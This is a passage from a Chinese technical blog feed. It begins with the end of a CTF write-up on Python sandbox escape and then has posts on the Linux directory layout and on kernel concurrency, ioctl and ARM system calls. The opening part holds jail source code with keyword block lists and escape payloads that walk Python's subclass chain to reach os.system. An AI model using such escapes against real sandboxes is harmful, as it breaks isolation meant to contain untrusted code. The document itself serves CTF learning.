targets.remove(&apos;raw_input&apos;)    targets.remove(&apos;print&apos;)    for x in targets:        del __builtins__.__dict__[x]  while 1:        print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;)      data = raw_input()      for no in banned:          if no.lower() in data.lower():              print(&quot;No bueno&quot;)              break      else: # this means nobreak          exec data  </code></pre><p>相对于第一题，第二题是没有直接的回显。<br>我们可以用catch_warnings类（索引在59），进行命令执行。<br><img src="\images\pasted-314.png" alt="upload successful"></p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</code></pre><p><br><br><br></p><h1 id="案例3"><a href="#案例3" class="headerlink" title="案例3"></a>案例3</h1><pre><code># -*-coding:utf-8-*- #!/usr/bin/python3  import sys, cmd, os  del __builtins__.__dict__[&apos;__import__&apos;]  del __builtins__.__dict__[&apos;eval&apos;]  intro = &quot;&quot;&quot;pwnhub cuitpwn everythingRules:    -No import    -No ...    -No flag&quot;&quot;&quot;  def execute(command):         exec(command, globals())  class Jail(cmd.Cmd):      prompt     = &apos;&gt;&gt;&gt; &apos;      filtered    = &apos;\&apos;|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back&apos;.split(&apos;|&apos;)      def do_EOF(self, line):          sys.exit()      def emptyline(self):          return cmd.Cmd.emptyline(self)      def default(self, line):          sys.stdout.write(&apos;\x00&apos;)      def postcmd(self, stop, line):          if any(f in line for f in self.filtered):              print(&quot;You are a big hacker !!!&quot;)              print(&quot;Go away&quot;)          else:             try:                  execute(line)             except NameError:                  print(&quot;NameError: name &apos;%s&apos; is not defined&quot; % line)             except Exception:                  print(&quot;Error: %s&quot; % line)          return cmd.Cmd.postcmd(self, stop, line)  if __name__ == &quot;__main__&quot;:      try:          Jail().cmdloop(intro)      except KeyboardInterrupt:          print(&quot;\rSee you next time !&quot;)  </code></pre><p>这题是cuit2017的题目，python3环境。<br>这里主要过滤了大量的字符，包括1，2题所用的点号。</p><ul><li>print(getattr(os, “system”)</li></ul><p>获取system函数地址，</p><ul><li>print(getattr(os, “system”)(“ls”))</li></ul><p>执行system(“ls”)<br>下面是获取flag的姿势<br><img src="\images\pasted-315.png" alt="upload successful"></p><p>以上都是利用Python作为脚本语言的特性来逃逸<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 沙箱逃逸 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux文件系统</title>
      <link href="/2018/10/17/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2018/10/17/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<p>rootfs其实就是，针对特定的操作系统的架构，一种实现的形式;具体表现为，特定的目录（就理解为windows的文文件夹），目录之间的关系，即组织架构，以及特定的各种文件；<br><br><br>/boot：系统启动的相关文件，如内核， initrd，以及grup（bootloader)，建议单独分区，分区千万不要做lvm<br>/dev：设备文件  </p><ul><li>块设备：随机访问，以数据块为单位</li><li>字符设备：线性访问，以字符为单位</li><li>设备号：主设备和次设备号  </li></ul><p>/etc：配置文件<br>/home：用户的家目录，每一个用户对应一个（当然在创建用户时，可不创建），建议单独分区<br>/root：管理员的家目录，不可单独分区<br>/lib：库文件<br>/lib/modules：内核模块文件</p><ul><li>静态库: 以.a结尾</li><li>动态库: 以.so结尾（类似windows .dll文件）</li></ul><p>/media：挂载点目录，以移动设备为主<br>/mnt：挂载点目录，以额外临时文件系统为主（如：USB设备）<br>/opt：可选目录，时期是用来安装第三方软件<br>/proc：伪文件系统，内核映射文件，不可单独分区，默认为空<br>/sys：伪文件系统，跟硬件设备相关属性的映射文件，不可单独分区，默认为空<br>/tmp：临时文件<br>/var/tmp：临时文件<br>/bin：可执行文件，主要是用户执行命令<br>/sbin：可执行文件，主要是管理命令<br>/usr(universal share read-only)：只读文件<br>/usr/bin：执行文件<br>/usr/sbin：执行文件<br>/usr/lib：库文件<br>/usr/local：第三方软件安装目录  </p><ul><li>/usr/local/bin  </li><li>/usr/local/sbin</li><li>/usr/local/lib<br><br></li></ul><p>busybox详细介绍：<br><a href="https://www.ibm.com/developerworks/cn/linux/l-busybox/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-busybox/</a><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux文件系统 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（七）</title>
      <link href="/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%83%EF%BC%89/"/>
      <url>/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%83%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* 1.并发和竞态简介* 2.竞态解决办法* 3.为我们的虚拟设备增加并发控制</code></pre><h1 id="并发和竞态简介"><a href="#并发和竞态简介" class="headerlink" title="并发和竞态简介"></a>并发和竞态简介</h1><h2 id="并发与竞态概念"><a href="#并发与竞态概念" class="headerlink" title="并发与竞态概念"></a>并发与竞态概念</h2><h3 id="何为并发"><a href="#何为并发" class="headerlink" title="何为并发"></a>何为并发</h3><p>并发是指多个执行单元同时、并行被执行。</p><h3 id="何为竞态"><a href="#何为竞态" class="headerlink" title="何为竞态"></a>何为竞态</h3><p>并发的执行单元对共享资源（硬件资源和软件上的全局变量，静态变量等）的访问容易发生竞态。</p><h3 id="我们虚拟设备的缺陷"><a href="#我们虚拟设备的缺陷" class="headerlink" title="我们虚拟设备的缺陷"></a>我们虚拟设备的缺陷</h3><p>对于我们前期的虚拟设备驱动个，假设一个执行单元A对其写入300个字符‘a’，而另一个执行单元B对其写入300个字符‘b’，第三个执行单元读取所有字符。如果A、B被顺序执行那么C读出的则不会出错，但如果A、B并发执行，那结果则是我们不可料想的。</p><h2 id="竞态发生的情况"><a href="#竞态发生的情况" class="headerlink" title="竞态发生的情况"></a>竞态发生的情况</h2><ul><li>对称多处理器（SMP）的多个CPU：SMP是一种紧耦合、共享存储的系统模型，它的特点是多个CPU使用共同的系统总线，因此可以访问共同的外设和存储器。</li><li>单CPU内进程与抢占它的进程：2.6的内核支持抢占调度，一个进程在内核执行的时候可能被另一高优先级进程打断。</li><li>中断（硬中断、软中断、tasklet、低半部）与进程之间：中断可以打断正在执行的进程，处理中断的程序和被打断的进程间也可能发生竞态。<br><br><br><br></li></ul><h1 id="竞态的解决办法"><a href="#竞态的解决办法" class="headerlink" title="竞态的解决办法"></a>竞态的解决办法</h1><p>解决竞态问题的途径是保证对共享资源的互斥访问。访问共享资源的代码区域称为临界区，临界区要互斥机制保护。Linux设备驱动中常见的互斥机制有以下方式：中断屏蔽、原子操作、自旋锁和信号量等。<br>上面我们已经分析了竞态产生的原因、发生的情况以及解决办法，下面我们对常见的解决办法一一分析。</p><h2 id="中断屏蔽"><a href="#中断屏蔽" class="headerlink" title="中断屏蔽"></a>中断屏蔽</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在单CPU中避免竞态的一种简单方法是在进入临界区之前屏蔽系统的中断。由于linux的异步I/O、进程调度等很多内容都依靠中断，所以我们应该尽快的执行完临界区的代码，换句话就是临界区代码应该尽量少。</p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了下面具体方法<br>Local_irq_disable();  //屏蔽中断<br>Local_irq_enable();  //打开中断<br>Local_irq_save(flags);  //禁止中断并保存当前cpu的中断位信息 </p><h2 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>原子操作指在执行过程中不会被别的代码中断的操作。</p><h3 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了一系列的函数来实现内核中的原子操作，这些操作分为两类，一类是整型原子操作，另一类是位原子操作，其都依赖底层CPU的原子操作实现，所以这些函数与CPU架构有密切关系。</p><h4 id="整型原子操作"><a href="#整型原子操作" class="headerlink" title="整型原子操作"></a>整型原子操作</h4><ul><li>设置原子变量的值<br>atomic_t v = ATOMIC_INIT(0);  //定义原子变量v并初始化为0<br>void atomic_set(atomic_t *v, int i);  //设置原子变量值为i    </li><li>获取原子变量的值<br>atomic_read(atomic_t *v);  //返回原子变量v的值  </li><li>原子变量加、减操作<br>void atomic_add(int i, atomic_t <em>v);  //原子变量v增加i<br>void atomic_sub(int I, atomic_t </em>v);  //原子变量v减少i  </li><li>原子变量自增、自减<br>void atomic_inc(atomic_t <em>v);  //原子变量v自增1<br>void atomic_dec(atomic_t </em>v);  //原子变量v自减1   </li><li>操作并测试<br>int atomic_inc_and_test(atomic_t <em>v);<br>int atomic_dec_and_test(atomic_t </em>v);<br>int atomic_sub_and_test(int i,atomic_t <em>v);<br>/</em>上述三个函数对原子变量v自增、自减和减操作（没有加）后测试其是否为0，如果为0返回true，否则返回false*/  </li><li>操作并返回<br>int atomic_add_return(int i,atomic_t <em>v);<br>int atomic_sub_return(int i,atomic_t </em>v);<br>int atomic_inc_return(atomic_t <em>v);<br>int atomic_dec_return(atomic_t </em>v);<br>/<em>上述函数对原子变量v进行自增、自减、加、减操作，并返回新的值</em>/ </li></ul><h4 id="位原子操作"><a href="#位原子操作" class="headerlink" title="位原子操作"></a>位原子操作</h4><ul><li>设置位<br>void set_bit(nr,void *addr);  //设置addr地址的第nr位，即向该位写入1。 </li><li>清除位<br>void clear_bit(nr,void *addr);  //清除addr地址的第nr位，即向该位写入0。 </li><li>改变位<br>void change_bit(nr,void *addr);  //对addr地址的第nr取反 </li><li>测试位<br>int test_bit(nr,void *addr);  //返回addr地址的第nr位 </li><li>测试并操作位<br>int test_and_set_bit(nr,void <em>addr);<br>int test_and_clear_bit(nr,void </em>addr);<br>int test_and_change_bit(nr,void <em>addr);<br>/</em>上述函数等同于执行test_bit后，再执行xxx_bit函数*/ </li></ul><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><p>自旋锁是一种对临界资源进行互斥访问的手段。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>为获得自旋锁，在某CPU上运行的代码需先执行一个原子操作，该操作测试并设置某个内存变量，由于其为原子操作，所以在该操作完成之前其他执行单元不可能访问这个内存变量，如果测试结果表明已经空闲，则程序获得这个自旋锁并继续执行，如果测试结果表明该锁仍被占用，程序将在一个小的循环内重复这个“测试并设置”操作，即进行所谓的“自旋”，通俗的说就是在“原地打转”。        </p><h3 id="具体操作-2"><a href="#具体操作-2" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与自旋锁相关的操作主要有：</p><ul><li>定义自旋锁<br>spinlock_t lock; </li><li>初始自旋锁<br>spin_lock_init(lock);</li><li>获得自旋锁<br>spin_lock(lock);  //获得自旋锁<br>lockspin_trylock(lock);  //尝试获取lock如果不能获得锁，返回假值，不在原地打转。 </li><li>释放自旋锁<br>spin_unlock(lock);  //释放自旋锁<br>为保证我们执行临界区代码的时候不被中断等影响我们的自旋锁又衍生了下面的内容</li><li>自旋锁衍生<br>  spin_lock_irq() = spin_lock() + local_irq_disable()<br>  spin_unlock_irq() = spin_unlock() + local_irq_enable()<br>  spin_lock_irqsave() = spin_lock() + local_irq_save()<br>  spin_unlock_irqrestore() = spin_unlock() + local_irq_restore()<br>  spin_lock_bh() = spin_lock() + local_bh_disable()<br>  spin_unlock_bh() = spin_unlock() + local_bh_disable() </li></ul><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ul><li>自旋锁实质是忙等锁，因此在占用锁时间极短的情况下，使用锁才是合理的，反之则会影响系统性能。</li><li>自旋锁可能导致系统死锁。</li><li>自旋锁锁定期间不能调用可能引起进程调度的函数。</li></ul><h2 id="读写自旋锁"><a href="#读写自旋锁" class="headerlink" title="读写自旋锁"></a>读写自旋锁</h2><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><p>为解决自旋锁中不能允许多个单元并发读的操作，衍生出了读写自旋锁，其不允许写操作并发，但允许读操作并发。</p><h3 id="具体操作-3"><a href="#具体操作-3" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写自旋锁相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>rwlock_t my_rwlock = RW_LOCK_UNLOCKED;  //静态初始化rwlock_t   my_rwlock;<br>rwlock_init(&amp;my_rwlock);  //动态初始化   </li><li>读锁定<br>read_lock();<br>read_lock_irqsave();<br>read_lock_irq();read_lock_bh(); </li><li>读解锁<br>read_unlock();<br>read_unlock_irqrestore();<br>read_unlock_irq();read_unlock_bh(); </li><li>写锁定<br>write_lock();<br>write_lock_irqsave();<br>write_lock_irq();<br>write_lock_bh();<br>write_trylock(); </li><li>写解锁<br>  write_unlock();<br>write_unlock_irqrestore();<br>write_unlock_irq();<br>write_unlock_bh(); </li></ul><h2 id="顺序锁"><a href="#顺序锁" class="headerlink" title="顺序锁"></a>顺序锁</h2><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><p>顺序锁是对读写锁的一种优化，如果使用顺序锁，读执行单元在写执行单元对被顺序锁保护的共享资源进行写操作时仍然可以继续读，不必等待写执行单元的完成，写执行单元也不需等待读执行单元完成在进行写操作。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>顺序锁保护的共享资源不含有指针，因为在写执行单元可能使得指针失效，但读执行单元如果此时访问该指针，将导致oops。</p><h3 id="具体操作-4"><a href="#具体操作-4" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与顺序锁相关的操作主要有：</p><ul><li>写执行单元获得顺序锁<br>write_seqlock();<br>write_tryseqlock();<br>write_seqlock_irqsave();<br>write_seqlock_irq();<br>write_seqlock_bh(); </li><li>写执行单元释放顺序锁<br>write_sequnlock();<br>write_sequnlock_irqrestore();<br>write_sequnlock_irq();<br>write_sequnlock_bh(); </li><li>读执行单元开始<br>read_seqbegin();<br>read_seqbegin_irqsave();  //local_irq_save + read_seqbegin </li><li>读执行单元重读<br>read_seqretry ();<br>read_seqretry_irqrestore (); </li></ul><h2 id="RCU（读—拷贝—更新）"><a href="#RCU（读—拷贝—更新）" class="headerlink" title="RCU（读—拷贝—更新）"></a>RCU（读—拷贝—更新）</h2><h3 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h3><p>RCU可以看做是读写锁的高性能版本，相比读写锁，RCU的优点在于即允许多个读执行单元同时访问被保护数据，又允许多个读执行单元和多个写执行单元同时访问被保护的数据。</p><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>RCU不能代替读写锁。</p><h3 id="具体操作：linux内核中与RCU相关的操作主要有："><a href="#具体操作：linux内核中与RCU相关的操作主要有：" class="headerlink" title="具体操作：linux内核中与RCU相关的操作主要有："></a>具体操作：linux内核中与RCU相关的操作主要有：</h3><ul><li>读锁定<br>rcu_read_lock ();<br>rcu_read_lock_bh ();  </li><li>读解锁<br>rcu_read_unlock ();<br>rcu_read_unlock_bh (); </li><li>同步RCU<br>synchronize_rcu ();  //由RCU写执行单元调用<br>synchronize_sched();  //可以保证中断处理函数处理完毕，不能保证软中断处理结束</li><li>挂接回调<br>call_rcu ();<br>call_rcu_bh ();<br>有关RCU的操作还有很多，大家可以参考网络。</li></ul><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><h3 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h3><p>信号量用于保护临界区的常用方法与自旋锁类似，但不同的是当获取不到信号量时，进程不会原地打转而是进入休眠等待状态。</p><h3 id="具体操作-5"><a href="#具体操作-5" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与信号量相关的操作主要有：</p><ul><li>定义信号量<br>Struct semaphore sem; </li><li>初始化信号量<br>void sema_init(struct semaphore *sem, int val);  //初始化sem为val，当然还有系统定义的其他宏初始化，这里不列举 </li><li>获得信号量<br>void down(struct semaphore <em>sem);  //获得信号量sem，其会导致睡眠，并不能被信号打断<br>int down_interruptible(struct semaphore </em>sem);  //进入睡眠可以被信号打断<br>int down_trylock(struct semaphore *sem);  //不会睡眠 </li><li>释放信号量　　<br>void up(struct semaphore *sem);  //释放信号量，唤醒等待进程<br>注：当信号量被初始为0时，其可以用于同步。</li></ul><h2 id="Completion用于同步"><a href="#Completion用于同步" class="headerlink" title="Completion用于同步"></a>Completion用于同步</h2><h3 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h3><p>linux中的同步机制。</p><h3 id="具体操作-6"><a href="#具体操作-6" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与Completion相关的操作主要有：</p><ul><li>定义Completion<br>struct completion *my_completion; </li><li>初始化Completion<br>void init_completion(struct completion *x); </li><li>等待Completion<br>void wait_for_completion(struct completion *); </li><li>唤醒Completion　　<br>void complete(struct completion <em>);  //唤醒一个 　　<br>void complete_all(struct completion </em>);  //唤醒该Completion的所有执行单元 </li></ul><h2 id="读写信号量"><a href="#读写信号量" class="headerlink" title="读写信号量"></a>读写信号量</h2><h3 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h3><p>与自旋锁和读写自旋锁的关系类似</p><h3 id="具体操作-7"><a href="#具体操作-7" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写信号量相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>struct rw_semaphore sem;<br>init_rwsem(&amp;sem); </li><li>读信号量获取<br>down_read ();<br>down_read_trylock(); </li><li>读信号量释放<br>up_read (); </li><li>写信号量获取<br>down_write ();<br>down_write_trylock ();</li><li>写信号量释放<br>up_write(); </li></ul><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h3 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h3><p>用来实现互斥操作</p><h3 id="具体操作-8"><a href="#具体操作-8" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与互斥体相关的操作主要有：</p><ul><li>定义和初始化互斥体<br>struct mutex lock;mutex_init(&amp;lock); </li><li>获取互斥体<br>void mutex_lock(struct mutex <em>lock);<br>int mutex_lock_interruptible(struct mutex </em>lock);<br>int mutex_lock_killable(struct mutex *lock); </li><li>释放互斥体<br>void mutex_unlock(struct mutex *lock);  </li></ul><p>上面我们介绍了linux内核中为了解决竞态所提供的方法，我们下面使用信号量为我们的虚拟设备增加并发控制。<br><br><br><br></p><h1 id="为我们的虚拟设备增加并发控制"><a href="#为我们的虚拟设备增加并发控制" class="headerlink" title="为我们的虚拟设备增加并发控制"></a>为我们的虚拟设备增加并发控制</h1><p>我们增加了并发控制后的代码如下，详细代码参考https:  //github.com/wrjvszq/myblongs  </p><pre><code>struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];  //全局内存4k    dev_t devno;    struct semaphore sem;  //并发控制所使用的信号量};static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}</code></pre>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（六）</title>
      <link href="/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%85%AD%EF%BC%89/"/>
      <url>/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%85%AD%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* 1.字符设备控制方法实现* 2.揭秘系统调用本质</code></pre><h1 id="字符设备控制方法实现"><a href="#字符设备控制方法实现" class="headerlink" title="字符设备控制方法实现"></a>字符设备控制方法实现</h1><h2 id="设备控制简介"><a href="#设备控制简介" class="headerlink" title="设备控制简介"></a>设备控制简介</h2><ul><li>何为设备控制：我们所接触的大部分设备，除了读、写、打开关闭等方法外，还应该具有控制方法，比如：控制电机转速、串口配置波特率等。这就是对设备的控制方法。</li><li>用户如何进行设备控制：类似与我们在用户空间使用read、open等函数对设备进行操作，我们在用户空间对设备控制的函数是ioctl其原型为 int ioctl(int fd, int cmd, …)//fd为要控制的设备文件的描述符，cmd是控制命令，…依据第二个参数类似与我们的printf等多参函数。 </li><li>Ioctl调用驱动那个函数：在我们的用户层进行ioctl调用的时候驱动会根据内核版本不同调用不同的函数：<br>2.6.36以前的内核版本会调用 long (<em>ioctl) (struct inode</em>,struct file <em>, unsigned int, unsigned long);<br>2.6.36以后的内核会调用 long (</em>unlocked_ioctl) (struct file *, unsigned int, unsigned long); </li></ul><h2 id="Ioctl实现"><a href="#Ioctl实现" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h2><h3 id="控制命令解析"><a href="#控制命令解析" class="headerlink" title="控制命令解析"></a>控制命令解析</h3><p>我们刚才说到ioctl进行控制的时候有个cmd参数其为int类型的也就是32位，我们的linux为了让这32位更加有意义，所表示的内容更多，所以将其分为了下面几个段  </p><ul><li>Type（类型/幻数8bit）：表明这是属于哪个设备的命令  </li><li>Number（序号8bit）：用来区分统一设备的不同命令  </li><li>Direction（2bit）：参数传递方向，可能的取值，_IOC_NODE（没有数据传输）、_IOC_READ（从设备读）、_IOC_WRITE（向设备写）  </li><li>Size（13/14bit()）：参数长度  </li></ul><h3 id="定义命令"><a href="#定义命令" class="headerlink" title="定义命令"></a>定义命令</h3><p>我们的控制命令如此复杂，为了方便我们的linux系统提供了固定的宏来解决命令的定义，具体如下：  </p><ul><li>_IO(type,nr); ：定义不带参数的命令</li><li>_IOR(type,nr,datatype); ：从设备读参数命令</li><li>_IOW(type,nr,datatype); ：向设备写入参数命令  </li></ul><p>下面定义一个向设备写入参数的命令例子  </p><p>#define MEM_CLEAR _IOW(‘m’,0,int)//通常用一个字母来表示命令的类型  </p><h3 id="Ioctl实现-1"><a href="#Ioctl实现-1" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h3><p>下面我们去向我们上次实现的字符设备中添加ioctl方法，并实现设备重启命令（虚拟重启），对于不支持的命令我们返回-EINVAL代码如下:</p><pre><code>long mem_ioctl(struct file *fd, unsigned int cmd, unsigned long arg){    switch(cmd){        case MEM_RESTART:        printk(&quot;&lt;0&gt; memdev is restart&quot;);        break;        default:        return -EINVAL;    }    return 0;}</code></pre><p><br><br><br></p><h1 id="揭秘系统调用本质"><a href="#揭秘系统调用本质" class="headerlink" title="揭秘系统调用本质"></a>揭秘系统调用本质</h1><p>由于我自己的PC的调用过程不太熟悉，下面以arm的调用过程分析一下我们用户层调用read之后发生了什么，是怎么调用到我们驱动写的read函数的呢，我们下面进行深入剖析。  </p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们首先使用得到arm上可执行的应用程序 arm-linux-gcc -g -static read_mem.c -o read_mem<br>然后使用arm-linux-objdump -D -S read_mem &gt;dump 得到汇编文件，我们找到main函数的汇编实现</p><pre><code>int main(void){    8228: e92d4800 push {fp, lr}    822c: e28db004 add fp, sp, #4 ; 0x4    8230: e24dd008 sub sp, sp, #8 ; 0x8    int fd = 0;    8234: e3a03000 mov r3, #0 ; 0x0    8238: e50b3008 str r3, [fp, #-8]    int test = 0;    823c: e3a03000 mov r3, #0 ; 0x0    8240: e50b300c str r3, [fp, #-12]    fd = open(&quot;/dev/memdev0&quot;,O_RDWR);    8244: e59f004c ldr r0, [pc, #76] ; 8298 &lt;main+0x70&gt;    8248: e3a01002 mov r1, #2 ; 0x2    824c: eb0028a3 bl 124e0 &lt;__libc_open&gt;    8250: e1a03000 mov r3, r0    8254: e50b3008 str r3, [fp, #-8]    read(fd,&amp;test,sizeof(int));    8258: e24b300c sub r3, fp, #12 ; 0xc    825c: e51b0008 ldr r0, [fp, #-8]    8260: e1a01003 mov r1, r3    8264: e3a02004 mov r2, #4 ; 0x4    8268: eb0028e4 bl 12600 &lt;__libc_read&gt;//我们的read函数最终调用了__libc_read    printf(&quot;the test is %d\n&quot;,test);    826c: e51b300c ldr r3, [fp, #-12]    8270: e59f0024 ldr r0, [pc, #36] ; 829c &lt;main+0x74&gt;    8274: e1a01003 mov r1, r3    8278: eb000364 bl 9010 &lt;_IO_printf&gt;    close(fd);    827c: e51b0008 ldr r0, [fp, #-8]    8280: eb0028ba bl 12570 &lt;__libc_close&gt;    return 0;    8284: e3a03000 mov r3, #0 ; 0x0}</code></pre><p>在上面代码中大部分汇编指令都知道用法，但是svc调用引起注意，通过查阅资料才发现，我们应用程序通过svc 0x00000000可以产生异常，进入内核空间。<br>然后呢，系统处理异常，这中间牵扯好多代码还有中断的一些知识，我们找时间在专门分析，总之经过一大堆的处理最后它会跳到entry-common.S中的下面代码：  </p><pre><code>.align    5ENTRY(vector_swi)    sub    sp, sp, #S_FRAME_SIZE    stmia    sp, {r0 - r12}            @ Calling r0 - r12ARM(    add    r8, sp, #S_PC        )ARM(    stmdb    r8, {sp, lr}^        )    @ Calling sp, lrTHUMB(    mov    r8, sp            )THUMB(    store_user_sp_lr r8, r10, S_SP    )    @ calling sp, lr    mrs    r8, spsr            @ called from non-FIQ mode, so ok.    str    lr, [sp, #S_PC]            @ Save calling PC    str    r8, [sp, #S_PSR]        @ Save CPSR    str    r0, [sp, #S_OLD_R0]        @ Save OLD_R0    zero_fp    /*     * Get the system call number.     */#if defined(CONFIG_OABI_COMPAT)    /*     * If we have CONFIG_OABI_COMPAT then we need to look at the swi     * value to determine if it is an EABI or an old ABI call.     */#ifdef CONFIG_ARM_THUMB    tst    r8, #PSR_T_BIT    movne    r10, #0                @ no thumb OABI emulation    ldreq    r10, [lr, #-4]            @ get SWI instruction#else    ldr    r10, [lr, #-4]            @ get SWI instruction  A710(    and    ip, r10, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_CPU_ENDIAN_BE8    rev    r10, r10            @ little endian instruction#endif#elif defined(CONFIG_AEABI)    /*     * Pure EABI user space always put syscall number into scno (r7).     */  A710(    ldr    ip, [lr, #-4]            @ get SWI instruction    )  A710(    and    ip, ip, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#elif defined(CONFIG_ARM_THUMB)    /* Legacy ABI only, possibly thumb mode. */    tst    r8, #PSR_T_BIT            @ this is SPSR from save_user_regs    addne    scno, r7, #__NR_SYSCALL_BASE    @ put OS number in    ldreq    scno, [lr, #-4]#else    /* Legacy ABI only. */    ldr    scno, [lr, #-4]            @ get SWI instruction  A710(    and    ip, scno, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_ALIGNMENT_TRAP    ldr    ip, __cr_alignment    ldr    ip, [ip]    mcr    p15, 0, ip, c1, c0        @ update control register#endif    enable_irq    get_thread_info tsk    adr    tbl, sys_call_table        @ load syscall table pointer</code></pre><p>该段代码中我们先会获取系统调用的标号刚才让大家记住的3，然后呢会去查找sys_call_table我们找到</p><pre><code>.type    sys_call_table, #objectENTRY(sys_call_table)#include &quot;calls.S&quot;#undef ABI#undef OBSOLETE</code></pre><p>在calls.S中我们找到了下面东西（列出部分）</p><pre><code>*//* 0 */        CALL(sys_restart_syscall)        CALL(sys_exit)        CALL(sys_fork_wrapper)        CALL(sys_read)        CALL(sys_write)/* 5 */        CALL(sys_open)        CALL(sys_close)        CALL(sys_ni_syscall)        /* was sys_waitpid */        CALL(sys_creat)        CALL(sys_link)</code></pre><p>我们发现我们刚才记住的数字3刚好对应的是sys_read，在read_write.c中我们可以找到sys_read函数</p><pre><code>SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count){    struct file *file;    ssize_t ret = -EBADF;    int fput_needed;    file = 